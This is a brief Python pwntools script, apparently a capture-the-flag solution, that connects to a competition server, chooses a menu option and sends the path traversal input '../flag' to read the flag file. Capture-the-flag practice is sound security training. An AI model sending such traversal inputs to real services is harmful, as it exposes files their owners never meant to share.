from pwn import *

host = "mngmnt-iface.ctfcompetition.com"
port = 1337

def main():
    connection = remote(host,port)
    
    # Printing out messeage from server
    print(connection.recv())
    print(connection.recv())

    connection.sendline("2")

    print(connection.recv())
    print(connection.recv())

    connection.sendline("../flag")

    print(connection.recv())
    print(connection.recv())

    connection.close()


main()
